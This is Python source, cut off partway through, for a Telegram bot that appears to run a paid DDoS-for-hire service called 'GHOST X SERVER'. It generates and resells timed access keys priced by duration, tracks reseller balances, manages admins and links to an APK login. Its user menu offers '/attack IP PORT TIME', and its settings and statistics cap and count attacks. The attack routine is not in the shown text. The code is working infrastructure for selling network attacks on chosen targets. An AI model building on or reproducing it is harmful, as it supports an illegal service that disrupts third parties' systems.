# pyrefly: ignore [missing-import]
import telebot
from telebot import types
import os
import random
import threading
import string
import time
import requests
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv
from pymongo import MongoClient, ASCENDING, DESCENDING

# Load environment variables
load_dotenv()

# ========== READ FROM ENVIRONMENT VARIABLES ==========
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME")

RESELLER_PRICING = {
    "12h": 80,
    "1d": 150,
    "3d": 350,
    "7d": 500,
    "15d": 850,
    "30d": 1200
}

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable not set!")
    exit(1)

if not MONGODB_URI:
    print("❌ ERROR: MONGODB_URI environment variable not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== MONGODB CONNECTION ==========
try:
    client = MongoClient(MONGODB_URI)
    client.admin.command('ping')
    db = client[DATABASE_NAME]
    
    # Collections
    keys_collection = db.keys
    admins_collection = db.admins
    active_sessions_collection = db.active_sessions
    users_collection = db.users
    settings_collection = db.settings
    
    # Create indexes
    keys_collection.create_index([("key", ASCENDING)], unique=True)
    keys_collection.create_index([("generated_by", ASCENDING)])
    keys_collection.create_index([("expiry_at", ASCENDING)])
    admins_collection.create_index([("user_id", ASCENDING)], unique=True)
    active_sessions_collection.create_index([("key", ASCENDING)])
    settings_collection.create_index([("setting_key", ASCENDING)], unique=True)
    
    print("✅ MongoDB connected successfully!")
    
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    exit(1)

# ========== HELPER FUNCTIONS ==========

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if is_owner(user_id):
        return True
    return admins_collection.find_one({"user_id": user_id}) is not None

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        return timedelta(hours=hours)
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
        return timedelta(days=days)
    elif duration_str.endswith('m'):
        minutes = int(duration_str[:-1])
        return timedelta(minutes=minutes)
    return None

def parse_extended_duration(duration_str):
    duration_str = duration_str.lower().strip()
    parts = duration_str.split()
    total_timedelta = timedelta()
    for part in parts:
        if part.endswith('d'):
            try:
                days = int(part[:-1])
                total_timedelta += timedelta(days=days)
            except ValueError:
                return None
        elif part.endswith('h'):
            try:
                hours = int(part[:-1])
                total_timedelta += timedelta(hours=hours)
            except ValueError:
                return None
        elif part.endswith('m'):
            try:
                minutes = int(part[:-1])
                total_timedelta += timedelta(minutes=minutes)
            except ValueError:
                return None
        else:
            return None
    if total_timedelta == timedelta():
        return None
    return total_timedelta

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def format_expiry_ist(timestamp_ms):
    dt = datetime.fromtimestamp(timestamp_ms / 1000)
    dt_ist = dt + timedelta(hours=5, minutes=30)
    return dt_ist.strftime("%Y-%m-%d %H:%M:%S IST")

def get_brand_message(generator_id):
    admin_data = admins_collection.find_one({"user_id": generator_id})
    if admin_data:
        return admin_data.get('brand_message', "")
    return ""

def revoke_key_from_users(key):
    """Remove key from all users who redeemed it and deactivate their access"""
    users = users_collection.find({"key": key})
    for user in users:
        users_collection.update_one(
            {"user_id": user["user_id"]},
            {"$set": {"activated": False, "expires_at": None, "key": None}}
        )
        try:
            bot.send_message(user["user_id"], 
                f"🔴 Your key `{key}` has been deleted by an admin.\n\n"
                f"Your access has been revoked. Contact admin for a new key.",
                parse_mode="Markdown")
        except:
            pass

# ========== SETTINGS MANAGEMENT ==========

def get_setting(setting_key, default_value):
    """Get a setting value from database"""
    setting = settings_collection.find_one({"setting_key": setting_key})
    if setting:
        return setting.get("setting_value", default_value)
    return default_value

def set_setting(setting_key, setting_value, user_id):
    """Set a setting value in database"""
    settings_collection.update_one(
        {"setting_key": setting_key},
        {"$set": {
            "setting_value": setting_value,
            "updated_by": user_id,
            "updated_at": int(time.time() * 1000)
        }},
        upsert=True
    )

# ========== SERVER IP ==========
def get_server_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
        return ip if ip else "Unknown"
    except:
        try:
            ip = requests.get('https://ifconfig.me', timeout=5).text.strip()
            return ip if ip else "Unknown"
        except:
            return "Unknown"

# ========== COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    
    # Save user to database if not exists
    try:
        users_collection.update_one(
            {"user_id": user_id},
            {
                "$set": {
                    "username": message.from_user.username,
                    "first_name": message.from_user.first_name,
                    "last_active": int(time.time() * 1000)
                },
                "$setOnInsert": {
                    "started_at": int(time.time() * 1000)
                }
            },
            upsert=True
        )
    except Exception as e:
        print(f"Error saving user: {e}")
    
    if is_owner(user_id):
        bot.reply_to(message,
            f"👋 <b>Welcome Owner!</b>\n\n"
            f"📋 <b>Key Commands:</b>\n"
            f"/gen - Gen Key (1 Device)\n"
            f"/genlimit - Gen Key (Custom Limit)\n"
            f"/makekey [name] - Create Custom Key\n"
            f"/mykeys - View Your Keys\n"
            f"/allkeys - View All Keys\n"
            f"/checkkey [key] - Check Key Devices\n"
            f"/resetkey [key] - Force Logout User\n"
            f"/deletekey [key] - Delete Your Key\n"
            f"/extend [dur] - Extend ALL Redeemed Keys\n\n"
            f"🗑️ <b>Cleanup Commands:</b>\n"
            f"/delmykeys - Delete Your Keys\n"
            f"/delallkeys - Delete All Keys\n"
            f"/delallusedkeys - Delete Used Keys\n"
            f"/delallunusedkey - Delete Unused Keys\n\n"
            f"👥 <b>Admin Commands:</b>\n"
            f"/addadmin [id] - Add Admin\n"
            f"/removeadmin [id] - Remove Admin\n"
            f"/admins - View All Admins\n"
            f"/users - View Total Users\n\n"
            f"⚙️ <b>Settings Commands:</b>\n"
            f"/setbrand - Set custom brand message\n"
            f"/viewbrand - View custom brand message\n"
            f"/setmaxduration [s] - Max Attack Duration\n"
            f"/setcooldown [s] - Attack Cooldown\n"
            f"/viewsettings - View Settings\n"
            f"/broadcast [msg] - Message All Admins\n"
            f"/ip - Show Server IP\n\n"
            f"Use <b>/help</b> anytime to see this menu.", 
            parse_mode="HTML")
    elif is_admin(user_id):
        bot.reply_to(message,
            f"👋 <b>Welcome Admin!</b>\n\n"
            f"📋 <b>Commands:</b>\n"
            f"/gen - Generate Key\n"
            f"/mykeys - View your keys\n"
            f"/mybalance - View balance\n"
            f"/deletekey KEY - Delete your key\n"
            f"/setbrand - Set custom brand message\n"
            f"/viewbrand - View custom brand message\n\n"
            f"Use <b>/help</b> anytime to see this menu.", 
            parse_mode="HTML")
    else:
        bot.reply_to(message, 
            "👋 <b>Welcome User!</b>\n\n"
            "📋 <b>Commands:</b>\n"
            "/redeem KEY - Redeem key for APK\n"
            "/attack IP PORT TIME - Start attack from bot\n"
            "/active - View your active attacks\n\n"
            "Use <b>/help</b> anytime to see this menu.",
            parse_mode="HTML")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    start_cmd(message)

@bot.message_handler(commands=['users'])
def list_users_count(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Unauthorized (Owner Only)")
        return
        
    try:
        now = int(time.time() * 1000)
        one_day_ago = now - (24 * 60 * 60 * 1000)
        
        # User Stats
        total_users = users_collection.count_documents({})
        active_users_today = users_collection.count_documents({"last_active": {"$gt": one_day_ago}})
        
        # Key Stats
        total_keys = keys_collection.count_documents({})
        redeemed_keys = keys_collection.count_documents({"is_redeemed": 1})
        unused_keys = keys_collection.count_documents({"is_redeemed": 0, "is_active": 1})
        blocked_keys = keys_collection.count_documents({"is_active": 0})
        
        # Attack Stats
        total_bot_attacks = db.bot_attacks.count_documents({})
        bot_attacks_today = db.bot_attacks.count_documents({"start_time": {"$gt": one_day_ago}})
        
        # Admin Stats
        total_admins = admins_collection.count_documents({})
        
        # Format response
        response = (
            f"📊 <b>GHOST X SERVER ANALYTICS</b> 📊\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 <b>User Stats:</b>\n"
            f"• Total Bot Users: <code>{total_users}</code>\n"
            f"• Active Users (24h): <code>{active_users_today}</code>\n\n"
            f"🔑 <b>Key Stats:</b>\n"
            f"• Total Keys: <code>{total_keys}</code>\n"
            f"• Redeemed Keys: <code>{redeemed_keys}</code>\n"
            f"• Unused Keys (Ready): <code>{unused_keys}</code>\n"
            f"• Blocked/Deleted: <code>{blocked_keys}</code>\n\n"
            f"🚀 <b>Attack Stats (Bot):</b>\n"
            f"• Total Attacks: <code>{total_bot_attacks}</code>\n"
            f"• Attacks (24h): <code>{bot_attacks_today}</code>\n\n"
            f"👥 <b>Admin Stats:</b>\n"
            f"• Total Admins: <code>{total_admins}</code>\n\n"
            f"⏱️ <b>Last Updated:</b> {format_expiry_ist(now)}"
        )
        bot.reply_to(message, response, parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error retrieving analytics: {str(e)}")

# ========== KEY GENERATION ==========

@bot.message_handler(commands=['gen'])
def generate_keys(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        parts = message.text.split()
        if len(parts) == 2:
            duration_str = parts[1]
            quantity = 1
        elif len(parts) == 3:
            duration_str = parts[1]
            quantity = int(parts[2])
        else:
            pricing_text = (
                "📝 <b>How to Generate Keys:</b>\n"
                "<code>/gen &lt;duration&gt; [quantity]</code>\n\n"
                "<b>Examples:</b>\n"
                "<code>/gen 12h</code> - Generate 1 key for 12 hours\n"
                "<code>/gen 1d 5</code> - Generate 5 keys for 1 day\n\n"
                "💰 <b>Reseller Price List:</b>\n"
                "• 12 Hours: 80 balance\n"
                "• 1 Day: 150 balance\n"
                "• 3 Days: 350 balance\n"
                "• 7 Days: 500 balance\n"
                "• 15 Days: 850 balance\n"
                "• 30 Days: 1200 balance\n\n"
                "💡 <i>Note:</i> Owner can use any custom duration (e.g., 1h, 5d)."
            )
            bot.reply_to(message, pricing_text, parse_mode="HTML")
            return
        
        if quantity < 1 or quantity > 100:
            bot.reply_to(message, "Quantity must be between 1 and 100")
            return
            
        duration_str = duration_str.lower().strip()
        
        # Check pricing and balance for admins (Owner is exempt)
        cost_per_key = 0
        is_owner_user = is_owner(user_id)
        
        if not is_owner_user:
            if duration_str not in RESELLER_PRICING:
                allowed_durations = ", ".join(RESELLER_PRICING.keys())
                bot.reply_to(message, f"❌ Invalid duration for reseller! Allowed durations are: {allowed_durations}")
                return
            
            cost_per_key = RESELLER_PRICING[duration_str]
            total_cost = cost_per_key * quantity
            
            admin_data = admins_collection.find_one({"user_id": user_id})
            current_balance = admin_data.get('balance', 0) if admin_data else 0
            
            if current_balance < total_cost:
                bot.reply_to(message, f"❌ Insufficient balance!\nRequired: {total_cost}\nYour Balance: {current_balance}")
                return
        
        duration = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "Invalid duration format!")
            return
        
        keys_generated = []
        now = int(time.time() * 1000)
        duration_ms = int(duration.total_seconds() * 1000)
        
        for _ in range(quantity):
            key = generate_key()
            key_data = {
                'key': key,
                'generated_by': user_id,
                'generated_at': now,
                'expiry_at': 0,
                'duration_ms': duration_ms,
                'device_limit': 1,
                'is_active': 1,
                'is_used': 0,
                'used_by': None,
                'used_at': None
            }
            try:
                keys_collection.insert_one(key_data)
                keys_generated.append(key)
            except:
                key = generate_key()
                key_data['key'] = key
                keys_collection.insert_one(key_data)
                keys_generated.append(key)
        
        # Deduct balance for admins
        if not is_owner_user and cost_per_key > 0:
            admins_collection.update_one(
                {"user_id": user_id},
                {"$inc": {"balance": -total_cost}}
            )
        
        # Auto-delete unused keys older than 7 days
        auto_expiry = int((datetime.now() - timedelta(days=7)).timestamp() * 1000)
        keys_collection.update_many(
            {"is_used": 0, "generated_at": {"$lt": auto_expiry}, "is_active": 1},
            {"$set": {"is_active": 0}}
        )
        
        duration_display = duration_str.lower()
        
        if quantity == 1:
            key = keys_generated[0]
            response = (
                f"✅ <b>Key Generated!</b>\n\n"
                f"🔑 <b>Redeem Command:</b> <code>/redeem {key}</code>\n"
                f"⏱️ <b>Duration:</b> {duration_display}\n"
                f"📱 <b>Device Limit:</b> 1 device\n\n"
                f"📖 <b>Redeem Steps:</b>\n"
                f"1️⃣ Click/Copy the command: <code>/redeem {key}</code>\n"
                f"2️⃣ Send command to @ghostxserverbot\n"
                f"3️⃣ Open APK & login with key: <code>{key}</code>\n\n"
                f"💡 Note: Time starts when redeemed in bot."
            )
        else:
            key_list = "\n".join([f"<code>/redeem {k}</code>" for k in keys_generated])
            response = (
                f"✅ <b>{quantity} Keys Generated!</b>\n\n"
                f"🔑 <b>Redeem Commands:</b>\n{key_list}\n\n"
                f"⏱️ <b>Duration:</b> {duration_display}\n"
                f"📱 <b>Device Limit:</b> 1 device per key\n\n"
                f"📖 <b>Redeem Steps:</b>\n"
                f"1️⃣ Click/Copy any command from above\n"
                f"2️⃣ Send command to @ghostxserverbot\n"
                f"3️⃣ Open APK & login with that key\n\n"
                f"💡 Note: Time starts when redeemed in bot."
            )
        
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['genlimit'])
def generate_limited_keys(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command is only for Owner!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) == 3:
            duration_str = parts[1]
            device_limit = int(parts[2])
            quantity = 1
        elif len(parts) == 4:
            duration_str = parts[1]
            quantity = int(parts[2])
            device_limit = int(parts[3])
        else:
            bot.reply_to(message, "Usage: /genlimit 24h 3 or /genlimit 24h 5 3")
            return
        
        if quantity < 1 or quantity > 100:
            bot.reply_to(message, "Quantity must be between 1 and 100")
            return
        
        if device_limit < 1:
            bot.reply_to(message, "Device limit must be at least 1")
            return
        
        duration = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "Invalid duration. Use: 1h, 2d, 30m")
            return
        
        keys_generated = []
        now = int(time.time() * 1000)
        duration_ms = int(duration.total_seconds() * 1000)
        
        for _ in range(quantity):
            key = generate_key()
            key_data = {
                'key': key,
                'generated_by': user_id,
                'generated_at': now,
                'expiry_at': 0,
                'duration_ms': duration_ms,
                'device_limit': device_limit,
                'is_active': 1,
                'is_used': 0,
                'used_by': None,
                'used_at': None
            }
            keys_collection.insert_one(key_data)
            keys_generated.append(key)
        
        duration_display = duration_str.lower()
        
        if quantity == 1:
            key = keys_generated[0]
            response = (
                f"✅ <b>Key Generated!</b>\n\n"
                f"🔑 <b>Redeem Command:</b> <code>/redeem {key}</code>\n"
                f"⏱️ <b>Duration:</b> {duration_display}\n"
                f"📱 <b>Device Limit:</b> {device_limit} device(s)\n\n"
                f"📖 <b>Redeem Steps:</b>\n"
                f"1️⃣ Click/Copy the command: <code>/redeem {key}</code>\n"
                f"2️⃣ Send command to @ghostxserverbot\n"
                f"3️⃣ Open APK & login with key: <code>{key}</code>\n\n"
                f"💡 Note: Time starts when redeemed in bot."
            )
        else:
            key_list = "\n".join([f"<code>/redeem {k}</code>" for k in keys_generated])
            response = (
                f"✅ <b>{quantity} Keys Generated!</b>\n\n"
                f"🔑 <b>Redeem Commands:</b>\n{key_list}\n\n"
                f"⏱️ <b>Duration:</b> {duration_display}\n"
                f"📱 <b>Device Limit:</b> {device_limit} device(s) per key\n\n"
                f"📖 <b>Redeem Steps:</b>\n"
                f"1️⃣ Click/Copy any command from above\n"
                f"2️⃣ Send command to @ghostxserverbot\n"
                f"3️⃣ Open APK & login with that key\n\n"
                f"💡 Note: Time starts when redeemed in bot."
            )
        
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# ========== CUSTOM KEY GENERATION (OWNER ONLY) ==========

@bot.message_handler(commands=['makekey'])
def make_custom_key(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, 
                "📝 <b>Usage:</b> <code>/makekey &lt;key_text&gt; &lt;duration&gt; &lt;device_limit&gt;</code>\n\n"
                "<b>Examples:</b>\n"
                "<code>/makekey Sparsh 24h 5</code> - Key: Sparsh, 24 hours, 5 devices\n"
                "<code>/makekey Myname 2d 10</code> - Key: Myname, 2 days, 10 devices\n"
                "<code>/makekey Test 30m 3</code> - Key: Test, 30 minutes, 3 devices\n\n"
                "⚠️ <b>Note:</b> Key text can only contain letters & numbers (no spaces)\n"
                "Keys are case-sensitive - use exactly as entered!",
                parse_mode="HTML")
            return
        
        key_text = parts[1]
        duration_str = parts[2]
        device_limit = int(parts[3])
        
        # Validate key text (only alphanumeric, no spaces)
        if not key_text.isalnum():
            bot.reply_to(message, "❌ Key text can only contain letters and numbers (no spaces or special characters)!")
            return
        
        # Check if key already exists
        existing_key = keys_collection.find_one({"key": key_text})
        if existing_key:
            bot.reply_to(message, f"❌ Key `{key_text}` already exists! Please use a different name.", parse_mode="Markdown")
            return
        
        if device_limit < 1:
            bot.reply_to(message, "❌ Device limit must be at least 1!")
            return
        
        if device_limit > 100:
            bot.reply_to(message, "❌ Device limit cannot exceed 100!")
            return
        
        # Parse duration
        duration = parse_duration(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid duration. Use: 1h, 2d, 30m")
            return
        
        now = int(time.time() * 1000)
        duration_ms = int(duration.total_seconds() * 1000)
        
        # Create custom key
        key_data = {
            'key': key_text,
            'generated_by': user_id,
            'generated_at': now,
            'expiry_at': 0,
            'duration_ms': duration_ms,
            'device_limit': device_limit,
            'is_active': 1,
            'is_used': 0,
            'used_by': None,
            'used_at': None,
            'is_custom': 1
        }
        
        keys_collection.insert_one(key_data)
        
        duration_display = duration_str.lower()
        
        response = (
            f"✅ <b>Custom Key Created!</b>\n\n"
            f"🔑 <b>Redeem Command:</b> <code>/redeem {key_text}</code>\n"
            f"⏱️ <b>Duration:</b> {duration_display}\n"
            f"📱 <b>Device Limit:</b> {device_limit} device(s)\n\n"
            f"📖 <b>Redeem Steps:</b>\n"
            f"1️⃣ Click/Copy command: <code>/redeem {key_text}</code>\n"
            f"2️⃣ Send command to @ghostxserverbot\n"
            f"3️⃣ Open APK & login using key: <code>{key_text}</code>\n\n"
            f"💡 <b>Note:</b> Time starts when redeemed in bot.\n"
            f"⚠️ Key is case-sensitive – use exactly as shown."
        )
        
        bot.reply_to(message, response, parse_mode="HTML")
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid device limit! Please enter a number.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== VIEW KEYS ==========

@bot.message_handler(commands=['mykeys'])
def my_keys(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    keys = list(keys_collection.find({"generated_by": user_id}).sort("generated_at", -1).limit(50))
    now = int(time.time() * 1000)
    
    admin_data = admins_collection.find_one({"user_id": user_id})
    balance = admin_data.get('balance', 0) if admin_data else 0
    response = f"💰 <b>Your Balance:</b> {balance}\n"
    response += "🔑 <b>Your Keys:</b>\n\n"
    
    for data in keys:
        key = data.get('key')
        expiry = data.get('expiry_at', 0)
        is_active = data.get('is_active', 0)
        is_used = data.get('is_used', 0)
        device_limit = data.get('device_limit', 1)
        
        is_redeemed = data.get('is_redeemed', 0)
        
        if is_active == 0:
            status = "⏰ Deleted/Inactive"
        elif is_redeemed == 0:
            status = "⏳ Not Redeemed"
        elif expiry > now:
            status = "🔒 In Use" if is_used else "✅ Active"
        else:
            status = "⏰ Expired"
            
        expiry_readable = format_expiry_ist(expiry) if expiry > 0 else "Not Started"
        limit_text = f"{device_limit} device(s)"
        response += f"• <code>{key}</code>\n  Expires: {expiry_readable}\n  Status: {status}\n  Device Limit: {limit_text}\n\n"
    
    if len(keys) == 0:
        bot.reply_to(message, "No keys generated yet.")
    else:
        bot.reply_to(message, response[:4000], parse_mode='HTML')

@bot.message_handler(commands=['mybalance'])
def my_balance(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
        
    admin_data = admins_collection.find_one({"user_id": user_id})
    balance = admin_data.get('balance', 0) if admin_data else 0
    
    bot.reply_to(message, f"💰 <b>Your Current Balance:</b> {balance}", parse_mode="HTML")

# ========== DELETE KEY (Single) ==========

@bot.message_handler(commands=['deletekey'])
def delete_key(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        key = message.text.split()[1]
    except:
        bot.reply_to(message, "Usage: /deletekey KEY")
        return
    
    key_data = keys_collection.find_one({"key": key})
    
    if not key_data:
        bot.reply_to(message, f"Key <code>{key}</code> not found!", parse_mode='HTML')
        return
    
    if not is_owner(user_id) and key_data.get('generated_by') != user_id:
        bot.reply_to(message, "❌ You can only delete keys you generated!")
        return
    
    if key_data.get('is_used'):
        revoke_key_from_users(key)
    
    active_sessions_collection.delete_one({"key": key})
    keys_collection.delete_one({"key": key})
    
    bot.reply_to(message, f"✅ Key <code>{key}</code> deleted successfully!\n\n"
                 f"⚠️ Users using this key have been logged out.", parse_mode='HTML')

# ========== DELETE ALL MY KEYS ==========

@bot.message_handler(commands=['delmykeys'])
def delete_my_all_keys(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    keys = list(keys_collection.find({"generated_by": user_id}))
    
    if not keys:
        bot.reply_to(message, "❌ No keys found that were generated by you.")
        return
    
    deleted_count = 0
    revoked_users = 0
    
    for key_data in keys:
        key = key_data.get('key')
        
        if key_data.get('is_used'):
            revoke_key_from_users(key)
            revoked_users += 1
        
        active_sessions_collection.delete_one({"key": key})
        keys_collection.delete_one({"key": key})
        deleted_count += 1
    
    bot.reply_to(message, f"✅ Deleted {deleted_count} of your keys.\n"
                 f"👥 {revoked_users} users have been logged out.")

# ========== DELETE MY USED KEYS ==========

@bot.message_handler(commands=['delmyusedkeys'])
def delete_my_used_keys(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    keys = list(keys_collection.find({"generated_by": user_id, "is_used": 1}))
    
    if not keys:
        bot.reply_to(message, "❌ No used keys found that were generated by you.")
        return
    
    deleted_count = 0
    revoked_users = 0
    
    for key_data in keys:
        key = key_data.get('key')
        
        revoke_key_from_users(key)
        revoked_users += 1
        
        active_sessions_collection.delete_one({"key": key})
        keys_collection.delete_one({"key": key})
        deleted_count += 1
    
    bot.reply_to(message, f"✅ Deleted {deleted_count} of your used keys.\n"
                 f"👥 {revoked_users} users have been logged out.")

# ========== DELETE MY UNUSED KEYS ==========

@bot.message_handler(commands=['delmyunusedkeys'])
def delete_my_unused_keys(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    keys = list(keys_collection.find({"generated_by": user_id, "is_used": 0}))
    
    if not keys:
        bot.reply_to(message, "❌ No unused keys found that were generated by you.")
        return
    
    deleted_count = 0
    
    for key_data in keys:
        key = key_data.get('key')
        
        active_sessions_collection.delete_one({"key": key})
        keys_collection.delete_one({"key": key})
        deleted_count += 1
    
    bot.reply_to(message, f"✅ Deleted {deleted_count} of your unused keys.")

# ========== OWNER ONLY: DELETE ALL KEYS ==========

@bot.message_handler(commands=['delallkeys'])
def delete_all_keys(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    total_keys = keys_collection.count_documents({})
    
    keys = list(keys_collection.find({}))
    revoked_users = 0
    
    for key_data in keys:
        if key_data.get('is_used'):
            revoke_key_from_users(key_data.get('key'))
            revoked_users += 1
    
    active_sessions_collection.delete_many({})
    keys_collection.delete_many({})
    
    bot.reply_to(message, f"✅ All keys deleted!\n\n"
                 f"📊 Total keys deleted: {total_keys}\n"
                 f"👥 Users logged out: {revoked_users}")

# ========== OWNER ONLY: DELETE ALL USED KEYS ==========

@bot.message_handler(commands=['delallusedkeys'])
def delete_all_used_keys(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    keys = list(keys_collection.find({"is_used": 1}))
    
    if not keys:
        bot.reply_to(message, "❌ No used keys found.")
        return
    
    deleted_count = 0
    revoked_users = 0
    
    for key_data in keys:
        key = key_data.get('key')
        
        revoke_key_from_users(key)
        revoked_users += 1
        
        active_sessions_collection.delete_one({"key": key})
        keys_collection.delete_one({"key": key})
        deleted_count += 1
    
    bot.reply_to(message, f"✅ Deleted {deleted_count} used keys.\n"
                 f"👥 {revoked_users} users have been logged out.")

# ========== OWNER ONLY: DELETE ALL UNUSED KEYS ==========

@bot.message_handler(commands=['delallunusedkey'])
def delete_all_unused_keys(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    keys = list(keys_collection.find({"is_used": 0}))
    
    if not keys:
        bot.reply_to(message, "❌ No unused keys found.")
        return
    
    deleted_count = 0
    
    for key_data in keys:
        key = key_data.get('key')
        
        active_sessions_collection.delete_one({"key": key})
        keys_collection.delete_one({"key": key})
        deleted_count += 1
    
    bot.reply_to(message, f"✅ Deleted {deleted_count} unused keys.")

# ========== RESET KEY ==========

@bot.message_handler(commands=['resetkey'])
def reset_key(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        key = message.text.split()[1]
    except:
        bot.reply_to(message, "Usage: /resetkey KEY")
        return
    
    key_data = keys_collection.find_one({"key": key})
    
    if not key_data:
        bot.reply_to(message, f"Key <code>{key}</code> not found!", parse_mode='HTML')
        return
    
    if not is_owner(user_id) and key_data.get('generated_by') != user_id:
        bot.reply_to(message, "❌ You can only reset keys you generated!")
        return
    
    active_sessions_collection.delete_one({"key": key})
    
    bot.reply_to(message, f"🔄 Key <code>{key}</code> has been reset. User logged out.", parse_mode='HTML')

# ========== EXTEND KEY (OWNER ONLY) ==========

@bot.message_handler(commands=['extend'])
def extend_key(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
        
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "📝 **Usage:** `/extend <duration>`\n\n**Examples:**\n`/extend 3h`\n`/extend 1d 45h`\n\nThis will extend ALL redeemed keys.", parse_mode="Markdown")
            return
            
        duration_str = parts[1]
        
        duration = parse_extended_duration(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid duration format! Use e.g., `3h`, `1d`, `1d 45h`", parse_mode="Markdown")
            return
            
        duration_ms = int(duration.total_seconds() * 1000)
        
        # Find all redeemed keys
        redeemed_keys = list(keys_collection.find({"is_redeemed": 1}))
        
        if not redeemed_keys:
            bot.reply_to(message, "❌ No redeemed keys found to extend!")
            return
            
        extended_keys_count = 0
        notified_users_count = 0
        
        status_msg = bot.reply_to(message, f"⏳ Extending {len(redeemed_keys)} keys...")
        
        for key_data in redeemed_keys:
            key = key_data.get('key')
            current_expiry = key_data.get('expiry_at', 0)
            
            new_expiry = current_expiry + duration_ms
            
            keys_collection.update_one(
                {"key": key},
                {"$set": {"expiry_at": new_expiry}}
            )
            extended_keys_count += 1
            
            # Notify users who redeemed it
            users = users_collection.find({"key": key})
            for user in users:
                try:
                    expiry_readable = format_expiry_ist(new_expiry)
                    bot.send_message(user["user_id"], 
                        f"🎉 **Your key `{key}` has been extended by the Owner!**\n\n"
                        f"⏱️ Added: `{duration_str}`\n"
                        f"📅 New Expiry: {expiry_readable}",
                        parse_mode="Markdown")
                    notified_users_count += 1
                except:
                    pass
                    
        bot.edit_message_text(
            f"✅ **Bulk Extension Complete!**\n\n"
            f"📊 **Keys Extended:** {extended_keys_count}\n"
            f"🔔 **Users Notified:** {notified_users_count}\n"
            f"⏱️ **Duration Added:** {duration_str}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode="Markdown"
        )
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== VIEW ALL KEYS ==========

@bot.message_handler(commands=['allkeys'])
def all_keys(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    
    keys = list(keys_collection.find().sort("generated_at", -1).limit(30))
    now = int(time.time() * 1000)
    response = "📊 All Keys:\n\n"
    
    for data in keys:
        key = data.get('key')
        gen_by = data.get('generated_by')
        expiry = data.get('expiry_at', 0)
        is_active = data.get('is_active', 0)
        is_used = data.get('is_used', 0)
        device_limit = data.get('device_limit', 1)
        
        if is_active and expiry > now:
            status = "🔒 In Use" if is_used else "✅ Active"
        else:
            status = "⏰ Expired/Deleted"
        expiry_readable = format_expiry_ist(expiry)
        limit_text = f"{device_limit} device(s)"
        response += f"• <code>{key}</code>\n  By: {gen_by}\n  Expires: {expiry_readable}\n  Status: {status}\n  Device Limit: {limit_text}\n\n"
    
    if len(keys) == 0:
        bot.reply_to(message, "No keys in database.")
    else:
        bot.reply_to(message, response[:4000], parse_mode='HTML')

# ========== ADMIN MANAGEMENT ==========

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    
    try:
        new_admin = int(message.text.split()[1])
    except:
        bot.reply_to(message, "Usage: /addadmin USER_ID")
        return
    
    if admins_collection.find_one({"user_id": new_admin}):
        bot.reply_to(message, f"User <code>{new_admin}</code> is already an admin.", parse_mode='HTML')
        return
    
    admins_collection.insert_one({
